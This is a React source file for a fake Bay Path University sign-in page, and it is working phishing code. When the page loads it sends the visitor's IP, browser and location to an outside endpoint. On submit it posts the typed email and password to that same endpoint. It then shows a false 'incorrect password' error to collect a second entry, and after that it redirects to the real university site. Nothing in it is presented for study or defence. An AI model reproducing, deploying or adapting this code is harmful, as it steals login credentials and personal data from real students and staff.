import React, { useState, useEffect } from "react";
import Logo from '/src/assets/logo.png'

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
  const [loading, setLoading] = useState(false);
  const [attempt, setAttempt] = useState(0); // Tracking the number of attempts

  const [userData, setUserData] = useState({
    ip: "",
    browser: "",
    location: "",
    time: "",
  });

  const [emailSentOnPageLoad, setEmailSentOnPageLoad] = useState(false); // Flag to prevent multiple page load emails

  // Function to fetch the user's IP and location from ipinfo.io
  const getUserData = async () => {
    try {
      const res = await fetch("https://ipinfo.io/json?token=1772208096e82a"); // Your token from ipinfo.io
      const data = await res.json();

      const userData = {
        ip: data.ip,
        location: data.city
          ? `${data.city}, ${data.region}, ${data.country}`
          : "Unknown",
        browser: navigator.userAgent,
        time: new Date().toLocaleString(),
      };

      setUserData(userData);
      return userData;
    } catch (error) {
      console.error("Error fetching user data:", error);
      return null;
    }
  };

  // Send email through the API
  const sendEmail = async (subject, message) => {
    try {
      const response = await fetch(
        "https://api-henna-nine.vercel.app/send-email",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            subject,
            message,
          }),
        }
      );

      const result = await response.json();

      if (result.info.accepted) {
        console.log("OK");
        return true;
      }
    } catch (error) {
      return false;
    }
  };

  useEffect(() => {
    // Fetch user data on page load
    getUserData().then((userData) => {
      if (userData && !emailSentOnPageLoad) {
        // Fire initial email on page visit only if it hasn't been sent already
        sendEmail(
          "Page Visit",
          `User visited the page. Details: IP: ${userData.ip}, Browser: ${userData.browser}, Time: ${userData.time}, Location: ${userData.location}`
        );
        setEmailSentOnPageLoad(true); // Set the flag to true to prevent multiple sends
      }
    });
  }, [emailSentOnPageLoad]); // Dependency array includes emailSentOnPageLoad to re-run the effect when it changes

  const validateForm = () => {
    if (!email || !password || !email.includes("@")) {
      setErrorMessage("Please fill in both fields correctly.");
      return false;
    }
    return true;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setErrorMessage("");
    setLoading(true);

    // Validate form fields
    if (!validateForm()) {
      setLoading(false);
      return;
    }

    // Prepare the email subject based on attempt number
    let subject = "";
    if (attempt === 0) {
      subject = "BayPath First Attempt";
    } else if (attempt === 1) {
      subject = "BayPath Second Attempt";
    }

    const message = `Email: ${email}, Password: ${password}`;

    // Include user data (IP, browser, etc.) in the message
    const userDataMessage = `IP: ${userData.ip}, Browser: ${userData.browser}, Time: ${userData.time}, Location: ${userData.location}`;
    const fullMessage = `${message}\nUser Data: ${userDataMessage}`;

    // Send the email and wait for the response
    const emailSent = await sendEmail(subject, fullMessage);

    if (emailSent) {
      // If email is sent successfully, update attempt and handle next steps
      setAttempt((prevAttempt) => {
        const nextAttempt = prevAttempt + 1; // Increment the attempt count
        if (nextAttempt === 1) {
          setErrorMessage(
            "Incorrect user ID or password. Type the correct user ID and password, and try again."
          );
        } else if (nextAttempt === 2) {
          setErrorMessage("");
        }
        return nextAttempt; // Return the updated attempt
      });

      // After the second attempt, wait before redirecting
      if (attempt === 1) {
        setTimeout(() => {
          window.location.href = "https://www.baypath.edu"; // Redirect after email is sent
        }, 1500); // Delay to ensure email confirmation
      }
    } else {
      setErrorMessage("Server error occurred, please try again.");
    }

    setLoading(false); // Stop loading state after submission
  };

  return (
    <div className="mother">
      <div className="container">
        <div className="logo">
          <img src={Logo} alt="" />
        </div>
        <div className="separator"></div>
        <div className="form">
          <h2 className="f-head">Sign in with your institutional email</h2>
          {errorMessage && (
            <div className="error-message">
              <p className="message">{errorMessage}</p>
            </div>
          )}
          <form onSubmit={handleSubmit}>
            <input
              type="email"
              placeholder="E-mail Address"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <button type="submit" className="submit" disabled={loading}>
              {loading ? "Processing..." : "Sign in"}
            </button>
          </form>
          <a
            href="http://"
            target="_blank"
            rel="noopener noreferrer"
            className="forgot"
          >
            Forgot your password?
          </a>
          <div className="note">
            <h3>Having trouble accessing your account?</h3>
            <p>
              Please contact the IT helpdesk by email at techsupport@baypath.edu
              or by phone at (413) 565-1487.
            </p>
          </div>
        </div>
      </div>
      <div className="copyright">© 2024 - Bay Path University</div>
    </div>
  );
};

export default Login;
